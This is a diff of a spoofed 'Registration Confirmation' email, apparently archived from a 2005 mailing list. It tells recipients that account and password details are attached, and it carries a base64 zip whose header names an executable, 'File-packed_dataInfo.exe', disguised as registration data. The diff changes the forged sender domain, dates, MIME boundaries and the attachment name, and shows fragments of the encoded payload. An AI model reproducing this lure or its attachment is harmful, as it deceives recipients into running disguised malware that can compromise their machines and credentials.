@@ -1,29 +1,29 @@
-From: postman@cygnus.com
+From: hostmaster@21cn.com
 Subject: Registration Confirmation
-Date: Thu, 08 Dec 2005 02:02:03 GMT
-Message-ID: <59b3e50.defc84eb0b2@oss.sgi.com>
+Date: Thu, 08 Dec 2005 05:31:09 UTC
+Message-ID: <1ebb9b2229e76a3bf5@21cn.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======6abdce.4cf4c00"
+Content-Type: multipart/mixed; boundary="==dd0785de6dfa.d713ef5e31a3"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: x-Recipient@oss.sgi.com
+To: e-user@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======6abdce.4cf4c00
+--==dd0785de6dfa.d713ef5e31a3
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.cygnus.com
-***** Email: postman@cygnus.com
---======6abdce.4cf4c00
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+***** Go to: http://www.21cn.com
+***** Email: postman@21cn.com
+--==dd0785de6dfa.d713ef5e31a3
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======6abdce.4cf4c00--
+--==dd0785de6dfa.d713ef5e31a3--
